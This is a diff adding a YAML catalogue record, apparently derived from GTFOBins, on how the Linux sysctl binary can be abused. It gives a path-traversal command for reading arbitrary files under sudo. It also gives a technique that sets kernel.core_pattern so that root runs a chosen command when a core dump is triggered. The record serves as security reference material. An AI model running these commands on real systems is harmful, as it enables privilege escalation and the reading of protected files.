@@ -1,0 +1,98 @@
+id: gtfobins/sysctl/file-read/sudo
+type: binary
+platform: linux
+name: sysctl
+phases:
+- collection
+- privilege-escalation
+capabilities:
+- file-read
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: sysctl -n "/../../path/to/input-file"
+references:
+- https://gtfobins.github.io/gtfobins/sysctl/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        sysctl:
+          functions:
+            command:
+            - blind: true
+              code: sysctl 'kernel.core_pattern=|/path/to/command'
+              comment: 'The command is executed by `root` in the background when a core dump occurs.
+
+
+                To trigger a core dump, send the `SIGQUIT` signal to a process, for example:
+
+
+                ```
+
+                sleep infinity &
+
+                kill -QUIT $!
+
+                ```'
+              contexts:
+                sudo: null
+                suid: null
+            file-read:
+            - binary: false
+              code: sysctl -n "/../../path/to/input-file"
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              version: < 4
+    upstream_url: https://gtfobins.github.io/gtfobins/sysctl/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-read
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: collection
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: sudo
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:773d7413b82e8edf32d82d6b0e3dbc237b2af202b0d1c046e958a6eff81dc506
